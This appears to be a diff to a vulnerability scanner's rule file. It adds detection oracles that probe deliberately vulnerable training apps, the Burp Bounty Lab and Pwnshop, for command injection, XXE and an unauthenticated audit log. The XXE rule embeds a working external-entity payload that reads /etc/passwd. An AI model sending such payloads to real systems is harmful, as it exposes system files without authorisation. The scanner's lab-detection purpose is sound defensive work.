@@ -6749,6 +6749,56 @@ const burpbountyDomXssLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const burpbountyRcePingLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/rce/ping", ctx.origin);
+  probeUrl.searchParams.set("host", "127.0.0.1");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const pingOk =
+    /PING\s+127\.0\.0\.1/i.test(doc.body) &&
+    /icmp_seq=\d+/i.test(doc.body) &&
+    /packets transmitted.*received/i.test(doc.body);
+  if (!pingOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab /rce/ping?host= executes ping against attacker-supplied host — command injection/RCE profile oracle"
+    }
+  };
+};
+
+const burpbountyXxeParseLiveOracle: Rule = async (ctx) => {
+  if (!isBurpBountyLabHost(ctx)) return NEGATIVE;
+  const xxeUrl = new URL("/xxe/parse", ctx.origin).toString();
+  const payload =
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
+  const doc = await ctx.probe.get(xxeUrl, {
+    method: "POST",
+    body: payload,
+    headers: { "Content-Type": "application/xml" },
+    maxBytes: 8192
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const xxeOk =
+    /root:x:0:0:/.test(doc.body) &&
+    /\/bin\/(?:bash|sh)/.test(doc.body) &&
+    /Parsed XML|Extracted Data/i.test(doc.body);
+  if (!xxeOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: xxeUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Burp Bounty Lab POST /xxe/parse resolves external entities and returns /etc/passwd — XXE profile oracle"
+    }
+  };
+};
+
 // --- BugBait vulnerable Node.js training app (bugbait.io) -----------------------------
 const CLIENT_BUGBAIT_RES: { label: string; re: RegExp }[] = [
   {
@@ -22173,6 +22223,26 @@ const pwnshopDebugInfoLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const pwnshopEventsAuditLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/v1/events", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 8192 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const ct = doc.headers["content-type"] || "";
+  if (!/json/i.test(ct) && !/^\s*\{/.test(doc.body.trim())) return NEGATIVE;
+  if (!/"logs"\s*:\s*\[/.test(doc.body) || !/"action"\s*:/.test(doc.body)) return NEGATIVE;
+  if (!/"count"\s*:\s*\d+/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /"detail"\s*:/.test(doc.body) ? 0.92 : 0.9,
+    evidence: {
+      url,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pwnshop GET /api/v1/events returns unauthenticated audit log entries with action/detail fields (PWN-005)"
+    }
+  };
+};
+
 // --- VulnForge Academy gamified OWASP training (vulnforge-academy.vercel.app) -------
 const CLIENT_VULNFORGE_ACADEMY_RES: { label: string; re: RegExp }[] = [
   {
@@ -31355,6 +31425,7 @@ export const RULES: Record<string, Rule> = {
   clientSidePwnshopSstiOracle,
   clientSidePwnshopPathTraversalOracle,
   pwnshopDebugInfoLiveOracle,
+  pwnshopEventsAuditLiveOracle,
   clientSideVulnforgeAcademyEvidence,
   clientSideVulnforgeEvidence,
   clientSideVulnshopEvidence,
@@ -31604,6 +31675,8 @@ export const RULES: Record<string, Rule> = {
   burpbountySstiRenderLiveOracle,
   burpbountySsrfFetchLiveOracle,
   burpbountyDomXssLiveOracle,
+  burpbountyRcePingLiveOracle,
+  burpbountyXxeParseLiveOracle,
   clientSideBugbaitEvidence,
   clientSideArtemisKitEvidence,
   clientSideRailsgoatEvidence,
